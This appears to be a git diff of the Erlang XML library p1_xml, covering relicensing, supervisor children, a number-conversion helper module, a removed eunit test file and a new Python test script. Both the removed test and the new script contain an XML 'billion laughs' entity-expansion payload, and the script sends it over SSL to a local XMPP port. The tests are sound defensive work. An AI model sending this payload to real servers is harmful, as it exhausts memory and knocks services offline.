 %%% Author  : Evgeniy Khramtsov <ekhramtsov@process-one.net>
-%%% Purpose : XML supervisor
+%%% Purpose : p1_xml supervisor
 %%% Created : 1 May 2013 by Evgeniy Khramtsov <ekhramtsov@process-one.net>
 %%%
 %%%
-%%% Copyright (C) 2002-2015 ProcessOne, SARL. All Rights Reserved.
+%%% p1_xml, Copyright (C) 2002-2015   ProcessOne
 %%%
-%%% Licensed under the Apache License, Version 2.0 (the "License");
-%%% you may not use this file except in compliance with the License.
-%%% You may obtain a copy of the License at
+%%% This program is free software; you can redistribute it and/or
+%%% modify it under the terms of the GNU General Public License as
+%%% published by the Free Software Foundation; either version 2 of the
+%%% License, or (at your option) any later version.
 %%%
-%%%     http://www.apache.org/licenses/LICENSE-2.0
+%%% This program is distributed in the hope that it will be useful,
+%%% but WITHOUT ANY WARRANTY; without even the implied warranty of
+%%% MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
+%%% General Public License for more details.
 %%%
-%%% Unless required by applicable law or agreed to in writing, software
-%%% distributed under the License is distributed on an "AS IS" BASIS,
-%%% WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-%%% See the License for the specific language governing permissions and
-%%% limitations under the License.
+%%% You should have received a copy of the GNU General Public License
+%%% along with this program; if not, write to the Free Software
+%%% Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA
+%%% 02111-1307 USA
 %%%
 %%%----------------------------------------------------------------------
 
@@ -65,7 +68,11 @@ start_link() ->
 %% @end
 %%--------------------------------------------------------------------
 init([]) ->
-    {ok, {{one_for_one, 10, 1}, []}}.
+    XML = {xml, {xml, start_link, []},
+           permanent, brutal_kill, worker, [xml]},
+    XMLStream = {xml_stream, {xml_stream, start_link, []},
+                 permanent, brutal_kill, worker, [xml_stream]},
+    {ok, {{one_for_one, 10, 1}, [XML, XMLStream]}}.
 
 %%%===================================================================
 %%% Internal functions
diff --git a/src/xml_util.erl b/src/xml_util.erl
new file mode 100644
index 0000000..85f3422
--- /dev/null
+++ b/src/xml_util.erl
@@ -0,0 +1,86 @@
+%%%----------------------------------------------------------------------
+%%% File    : xml_util.erl
+%%% Author  : Holger Weiss <holger@zedat.fu-berlin.de>
+%%% Purpose : Provide replacements for newer Erlang functions
+%%% Created : 23 Dec 2014 by Holger Weiss <holger@zedat.fu-berlin.de>
+%%%
+%%%
+%%% p1_xml, Copyright (C) 2014-2015   ProcessOne
+%%%
+%%% This program is free software; you can redistribute it and/or
+%%% modify it under the terms of the GNU General Public License as
+%%% published by the Free Software Foundation; either version 2 of the
+%%% License, or (at your option) any later version.
+%%%
+%%% This program is distributed in the hope that it will be useful,
+%%% but WITHOUT ANY WARRANTY; without even the implied warranty of
+%%% MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
+%%% General Public License for more details.
+%%%
+%%% You should have received a copy of the GNU General Public License along
+%%% with this program; if not, write to the Free Software Foundation, Inc.,
+%%% 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+%%%
+%%%----------------------------------------------------------------------
+
+-module(xml_util).
+-author('holger@zedat.fu-berlin.de').
+
+-export([binary_to_float/1, binary_to_integer/1, binary_to_integer/2,
+	 float_to_binary/1, integer_to_binary/1, integer_to_binary/2]).
+
+-spec(binary_to_float/1 ::
+(
+  Binary :: binary())
+    -> float()
+).
+
+binary_to_float(Binary) ->
+    list_to_float(binary_to_list(Binary)).
+
+-spec(binary_to_integer/1 ::
+(
+  Binary :: binary())
+    -> integer()
+).
+
+binary_to_integer(Binary) ->
+    list_to_integer(binary_to_list(Binary)).
+
+-spec(binary_to_integer/2 ::
+(
+  Binary :: binary(),
+  Base   :: 2..36)
+    -> integer()
+).
+
+binary_to_integer(Binary, Base) ->
+    list_to_integer(binary_to_list(Binary), Base).
+
+-spec(float_to_binary/1 ::
+(
+  Float :: float())
+    -> binary()
+).
+
+float_to_binary(Float) ->
+    list_to_binary(float_to_list(Float)).
+
+-spec(integer_to_binary/1 ::
+(
+  Integer :: integer())
+    -> binary()
+).
+
+integer_to_binary(Integer) ->
+    list_to_binary(integer_to_list(Integer)).
+
+-spec(integer_to_binary/2 ::
+(
+  Integer :: integer(),
+  Base    :: 2..36)
+    -> binary()
+).
+
+integer_to_binary(Integer, Base) ->
+    list_to_binary(integer_to_list(Integer, Base)).
diff --git a/src/xmlrpc_codec.erl b/src/xmlrpc_codec.erl
index a8c958f..0945519 100644
--- a/src/xmlrpc_codec.erl
+++ b/src/xmlrpc_codec.erl
@@ -476,7 +476,7 @@ decode_double_cdata(__TopXMLNS, <<>>) ->
     erlang:error({xmlrpc_codec,
 		  {missing_cdata, <<>>, <<"double">>, __TopXMLNS}});
 decode_double_cdata(__TopXMLNS, _val) ->
-    case catch erlang:binary_to_float(_val) of
+    case catch xml_util:binary_to_float(_val) of
       {'EXIT', _} ->
 	  erlang:error({xmlrpc_codec,
 			{bad_cdata_value, <<>>, <<"double">>, __TopXMLNS}});
@@ -484,7 +484,7 @@ decode_double_cdata(__TopXMLNS, _val) ->
     end.
 
 encode_double_cdata(_val, _acc) ->
-    [{xmlcdata, erlang:float_to_binary(_val)} | _acc].
+    [{xmlcdata, xml_util:float_to_binary(_val)} | _acc].
 
 decode_string(__TopXMLNS, __IgnoreEls,
 	      {xmlel, <<"string">>, _attrs, _els}) ->
@@ -539,7 +539,7 @@ decode_int_cdata(__TopXMLNS, <<>>) ->
     erlang:error({xmlrpc_codec,
 		  {missing_cdata, <<>>, <<"int">>, __TopXMLNS}});
 decode_int_cdata(__TopXMLNS, _val) ->
-    case catch erlang:binary_to_integer(_val) of
+    case catch xml_util:binary_to_integer(_val) of
       {'EXIT', _} ->
 	  erlang:error({xmlrpc_codec,
 			{bad_cdata_value, <<>>, <<"int">>, __TopXMLNS}});
@@ -547,7 +547,7 @@ decode_int_cdata(__TopXMLNS, _val) ->
     end.
 
 encode_int_cdata(_val, _acc) ->
-    [{xmlcdata, erlang:integer_to_binary(_val)} | _acc].
+    [{xmlcdata, xml_util:integer_to_binary(_val)} | _acc].
 
 decode_i4(__TopXMLNS, __IgnoreEls,
 	  {xmlel, <<"i4">>, _attrs, _els}) ->
@@ -574,7 +574,7 @@ decode_i4_cdata(__TopXMLNS, <<>>) ->
     erlang:error({xmlrpc_codec,
 		  {missing_cdata, <<>>, <<"i4">>, __TopXMLNS}});
 decode_i4_cdata(__TopXMLNS, _val) ->
-    case catch erlang:binary_to_integer(_val) of
+    case catch xml_util:binary_to_integer(_val) of
       {'EXIT', _} ->
 	  erlang:error({xmlrpc_codec,
 			{bad_cdata_value, <<>>, <<"i4">>, __TopXMLNS}});
@@ -582,7 +582,7 @@ decode_i4_cdata(__TopXMLNS, _val) ->
     end.
 
 encode_i4_cdata(_val, _acc) ->
-    [{xmlcdata, erlang:integer_to_binary(_val)} | _acc].
+    [{xmlcdata, xml_util:integer_to_binary(_val)} | _acc].
 
 decode_value(__TopXMLNS, __IgnoreEls,
 	     {xmlel, <<"value">>, _attrs, _els}) ->
diff --git a/test/xml_test.erl b/test/xml_test.erl
deleted file mode 100644
index 97eb214..0000000
--- a/test/xml_test.erl
+++ /dev/null
@@ -1,295 +0,0 @@
-%%%----------------------------------------------------------------------
-%%% File    : xml_test.erl
-%%% Author  : Evgeniy Khramtsov <ekhramtsov@process-one.net>
-%%% Purpose : xml module testing
-%%% Created : 17 Dec 2013 by Evgeny Khramtsov <ekhramtsov@process-one.net>
-%%%
-%%%
-%%% Copyright (C) 2002-2015 ProcessOne, SARL. All Rights Reserved.
-%%%
-%%% Licensed under the Apache License, Version 2.0 (the "License");
-%%% you may not use this file except in compliance with the License.
-%%% You may obtain a copy of the License at
-%%%
-%%%     http://www.apache.org/licenses/LICENSE-2.0
-%%%
-%%% Unless required by applicable law or agreed to in writing, software
-%%% distributed under the License is distributed on an "AS IS" BASIS,
-%%% WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-%%% See the License for the specific language governing permissions and
-%%% limitations under the License.
-%%%
-%%%----------------------------------------------------------------------
-
--module(xml_test).
-
--compile(export_all).
-
--include_lib("eunit/include/eunit.hrl").
--include("xml.hrl").
-
-new() ->
-    new(self()).
-new(Pid) ->
-    new(Pid, infinity).
-new(Pid, MaxSize) ->
-    xml_stream:new(Pid, MaxSize).
-
-close(State) ->
-    ?assertEqual(true, xml_stream:close(State)).
-
-start_test() ->
-    ?assertEqual(ok, application:start(p1_xml)).
-
-tag_test() ->
-    ?assertEqual(#xmlel{name = <<"root">>},
-		 xml_stream:parse_element("<root/>")).
-
-empty_tag_test() ->
-    ?assertEqual(#xmlel{name = <<"root">>},
-		 xml_stream:parse_element("<root></root>")).
-
-tag_with_cdata_test() ->
-    ?assertEqual(#xmlel{name = <<"root">>,
-			children = [{xmlcdata, <<"cdata">>}]},
-		 xml_stream:parse_element("<root>cdata</root>")).
-
-tag_with_attrs_test() ->
-    ?assertEqual(#xmlel{name = <<"root">>,
-			attrs = [{<<"a">>, <<"1">>}, {<<"b">>, <<"2">>}]},
-		 xml_stream:parse_element("<root a='1' b='2'/>")).
-
-tag_with_empty_attr_test() ->
-    ?assertEqual(#xmlel{name = <<"root">>, attrs = [{<<"a">>, <<>>}]},
-		 xml_stream:parse_element("<root a=''/>")).
-
-tag_with_prefix_test() ->
-    ?assertEqual(#xmlel{name = <<"prefix:root">>,
-			attrs = [{<<"xmlns:prefix">>, <<"ns">>}]},
-		 xml_stream:parse_element("<prefix:root xmlns:prefix='ns'/>")).
-
-tag_with_attr_with_prefix_test() ->
-    ?assertEqual(#xmlel{name = <<"root">>,
-			attrs = [{<<"xmlns:prefix1">>, <<"ns1">>},
-				 {<<"xmlns:prefix2">>, <<"ns2">>},
-				 {<<"prefix1:a">>, <<"1">>},
-				 {<<"prefix2:b">>, <<"2">>}]},
-		 xml_stream:parse_element(
-		   "<root prefix1:a='1' xmlns:prefix1='ns1'"
-		   "      prefix2:b='2' xmlns:prefix2='ns2'/>")).
-
-tag_with_tags_test() ->
-    ?assertEqual(#xmlel{name = <<"root">>,
-			children = [#xmlel{name = <<"a">>},
-				    {xmlcdata, <<"cdata1">>},
-				    #xmlel{name = <<"b">>},
-				    {xmlcdata, <<"cdata2">>}]},
-		 xml_stream:parse_element("<root><a/>cdata1<b/>cdata2</root>")).
-
-receiver(Acc) ->
-    receive
-	{'$gen_event', Msg} ->
-	    receiver([Msg|Acc]);
-	{get, Parent} ->
-	    Parent ! lists:reverse(Acc),
-	    receiver([])
-    end.
-
-collect_events(Pid) ->
-    Pid ! {get, self()},
-    receive
-	Events ->
-	    Events
-    end.
-
-stream_test() ->
-    CallbackPid = spawn_link(fun() -> receiver([]) end),
-    Stream0 = new(CallbackPid),
-    Data = ["<prefix:root prefix:r='1' xmlns:prefix='ns'>",
-	    "junk1", "<a/>", "junk2", "<b>cdata</b>", "junk3",
-	    "</prefix:root>"],
-    StreamN = lists:foldl(
-		fun(Chunk, Stream) ->
-			xml_stream:parse(Stream, Chunk)
-		end, Stream0, Data),
-    close(StreamN),
-    ?assertEqual(
-       [{xmlstreamstart, <<"prefix:root">>, [{<<"xmlns:prefix">>, <<"ns">>},
-					     {<<"prefix:r">>, <<"1">>}]},
-	{xmlstreamelement, #xmlel{name = <<"a">>}},
-	{xmlstreamelement, #xmlel{name = <<"b">>,
-				  children = [{xmlcdata, <<"cdata">>}]}},
-	{xmlstreamend, <<"prefix:root">>}],
-       collect_events(CallbackPid)).
-
-stream_with_joined_cdata_test() ->
-    CallbackPid = spawn_link(fun() -> receiver([]) end),
-    Stream0 = new(CallbackPid),
-    Data = ["<root>", "<a>", "1", "2", "3", "</a>", "</root>"],
-    StreamN = lists:foldl(
-		fun(Chunk, Stream) ->
-			xml_stream:parse(Stream, Chunk)
-		end, Stream0, Data),
-    close(StreamN),
-    ?assertEqual(
-       [{xmlstreamstart, <<"root">>, []},
-	{xmlstreamelement, #xmlel{name = <<"a">>,
-				  children = [{xmlcdata, <<"123">>}]}},
-	{xmlstreamend, <<"root">>}],
-       collect_events(CallbackPid)).
-
-splitted_stream_test() ->
-    CallbackPid = spawn_link(fun() -> receiver([]) end),
-    Stream0 = new(CallbackPid),
-    Stream1 = xml_stream:parse(Stream0, "<root"),
-    ?assertEqual([], collect_events(CallbackPid)),
-    Stream2 = xml_stream:parse(Stream1, "><a>"),
-    ?assertEqual([{xmlstreamstart, <<"root">>, []}],
-		 collect_events(CallbackPid)),
-    Stream3 = xml_stream:parse(Stream2, "</a><b/><c attr="),
-    ?assertEqual([{xmlstreamelement, #xmlel{name = <<"a">>}},
-		  {xmlstreamelement, #xmlel{name = <<"b">>}}],
-		 collect_events(CallbackPid)),
-    Stream4 = xml_stream:parse(Stream3, "'1'></c>"),
-    ?assertEqual([{xmlstreamelement, #xmlel{name = <<"c">>,
-					    attrs = [{<<"attr">>, <<"1">>}]}}],
-		 collect_events(CallbackPid)),
-    Stream5 = xml_stream:parse(Stream4, ""),
-    ?assertEqual([], collect_events(CallbackPid)),
-    Stream6 = xml_stream:parse(Stream5, "</root>"),
-    ?assertEqual([{xmlstreamend, <<"root">>}], collect_events(CallbackPid)),
-    close(Stream6).
-
-too_big_test() ->
-    CallbackPid = spawn_link(fun() -> receiver([]) end),
-    Stream0 = new(CallbackPid, 5),
-    Stream1 = xml_stream:parse(Stream0, "<a>"),
-    Stream2 = xml_stream:parse(Stream1, "<b/>"),
-    Stream3 = xml_stream:parse(Stream2, "<c/>"),
-    Stream4 = xml_stream:parse(Stream3, "<de/>"),
-    ?assertEqual([{xmlstreamstart, <<"a">>, []},
-		  {xmlstreamelement, #xmlel{name = <<"b">>}},
-		  {xmlstreamelement, #xmlel{name = <<"c">>}},
-		  {xmlstreamerror, <<"XML stanza is too big">>}],
-		 collect_events(CallbackPid)),
-    close(Stream4).
-
-close_close_test() ->
-    Stream = new(),
-    close(Stream),
-    ?assertError(badarg, xml_stream:close(Stream)).
-
-close_parse_test() ->
-    Stream = new(),
-    close(Stream),
-    ?assertError(badarg, xml_stream:parse(Stream, "junk")).
-
-close_change_callback_pid_test() ->
-    Stream = new(),
-    close(Stream),
-    ?assertError(badarg, xml_stream:change_callback_pid(Stream, self())).
-
-change_callback_pid_test() ->
-    Pid1 = spawn_link(fun() -> receiver([]) end),
-    Pid2 = spawn_link(fun() -> receiver([]) end),
-    Stream0 = new(Pid1),
-    Stream1 = xml_stream:parse(Stream0, "<root>"),
-    ?assertEqual([{xmlstreamstart, <<"root">>, []}],
-		 collect_events(Pid1)),
-    Stream2 = xml_stream:change_callback_pid(Stream1, Pid2),
-    Stream3 = xml_stream:parse(Stream2, "</root>"),
-    ?assertEqual([{xmlstreamend, <<"root">>}],
-		 collect_events(Pid2)),
-    close(Stream3).
-
-badarg_new_test() ->
-    ?assertError(badarg, xml_stream:new(1)),
-    ?assertError(badarg, xml_stream:new(self(), unlimited)),
-    ?assertError(badarg, xml_stream:new(foo, fun() -> ok end)).
-
-badarg_parse_test() ->
-    Stream = new(),
-    ?assertError(badarg, xml_stream:parse(1, <<"<root>">>)),
-    ?assertError(badarg, xml_stream:parse(<<>>, "<root>")),
-    ?assertError(badarg, xml_stream:parse(Stream, blah)),
-    ?assertError(badarg, xml_stream:parse(foo, fun() -> ok end)),
-    close(Stream).
-
-badarg_change_callback_pid_test() ->
-    Stream = new(),
-    ?assertError(badarg, xml_stream:change_callback_pid(1, self())),
-    ?assertError(badarg, xml_stream:change_callback_pid(<<>>, self())),
-    ?assertError(badarg, xml_stream:change_callback_pid(Stream, foo)),
-    ?assertError(badarg, xml_stream:change_callback_pid(foo, fun() -> ok end)),
-    close(Stream).
-
-badarg_close_test() ->
-    Stream = new(),
-    ?assertError(badarg, xml_stream:close(1)),
-    ?assertError(badarg, xml_stream:close(<<>>)),
-    close(Stream).
-
-badarg_parse_element_test() ->
-    ?assertError(badarg, xml_stream:parse_element(1)).
-
-parse_error_test() ->
-    L = ["<", "<>", "</>", "</>", "/>",
-	 "<x", "<x>", "x/>", "<x/>junk",
-	 "<x a/>", "<x a=f/>", "<x a='5'>",
-	 "<x:y/>", "<x y:a='1'/>"],
-    lists:foreach(
-      fun(S) ->
-	      ?assertMatch({error, _}, xml_stream:parse_element(S))
-      end, L).
-
-dead_pid_test() ->
-    CallbackPid = spawn(fun() -> receiver([]) end),
-    ?assertEqual(true, exit(CallbackPid, kill)),
-    ?assertEqual(false, is_process_alive(CallbackPid)),
-    Stream0 = new(CallbackPid),
-    Stream1 = xml_stream:parse(Stream0, "<root><a/></root>"),
-    close(Stream1).
-
-huge_element_test() ->
-    Tags = [list_to_binary(["a", integer_to_list(I)])
-	    || I <- lists:seq(1, 100000)],
-    Data = ["<root>", [[$<, Tag, "/>"] || Tag <- Tags], "</root>"],
-    Els = #xmlel{name = <<"root">>,
-		 children = [#xmlel{name = Tag} || Tag <- Tags]},
-    ?assertEqual(Els, xml_stream:parse_element(Data)).
-
-many_stream_elements_test() ->
-    CallbackPid = spawn(fun() -> receiver([]) end),
-    Stream0 = new(CallbackPid),
-    Stream1 = xml_stream:parse(Stream0, "<root>"),
-    ?assertEqual([{xmlstreamstart, <<"root">>, []}],
-		 collect_events(CallbackPid)),
-    Stream2 = lists:foldl(
-		fun(I, Stream) ->
-			Tag = list_to_binary(["a", integer_to_list(I)]),
-			NewStream = xml_stream:parse(Stream, [$<, Tag, "/>"]),
-			?assertEqual([{xmlstreamelement, #xmlel{name = Tag}}],
-				     collect_events(CallbackPid)),
-			NewStream
-		end, Stream1, lists:seq(1, 100000)),
-    close(Stream2).
-
-billionlaughs_test() ->
-    Data =
-	"<?xml version='1.0'?><!DOCTYPE test [ <!ENTITY lol \"lol\"> "
-	"<!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"> "
-	"<!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\"> "
-	"<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\"> "
-	"<!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\"> "
-	"<!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\"> "
-	"<!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\"> "
-	"<!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\"> "
-	"<!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\"> "
-	"<!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\"> "
-	"] ><stream:stream xmlns='jabber:client' "
-	"xmlns:stream='http://etherx.jabber.org/streams' version='1.0' to='&lol9;'>\n",
-    CallbackPid = spawn_link(fun() -> receiver([]) end),
-    Stream0 = new(CallbackPid),
-    Stream1 = xml_stream:parse(Stream0, Data),
-    close(Stream1),
-    ?assertMatch([{xmlstreamerror, _}], collect_events(CallbackPid)).
diff --git a/tests/billionlaughs.py b/tests/billionlaughs.py
new file mode 100644
index 0000000..e260ab6
--- /dev/null
+++ b/tests/billionlaughs.py
@@ -0,0 +1,30 @@
+import socket
+import time
+
+host = 'localhost'
+port = 5223
+
+payload = '''<?xml version='1.0'?><!DOCTYPE test [ <!ENTITY lol "lol"> <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"> <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"> <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"> <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"> <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"> <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"> <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"> <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"> <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"> ] ><stream:stream xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' version='1.0' to='&lol9;'>'''
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect((host, port))
+
+ssl_sock = socket.ssl(s)
+
+print "Payload:\n" + payload + "\n"
+
+print "Sending XML billion laughs payload:\n"
+
+ssl_sock.write(payload)
+
+start = time.time()
+data = ssl_sock.read()
+end=time.time()
+
+print "\nOutput:\n"+data
+print "\n\nTotal time taken: "+str(end-start)+" seconds"
+
+# Note that you need to close the underlying socket, not the SSL object.
+del ssl_sock
+s.close()
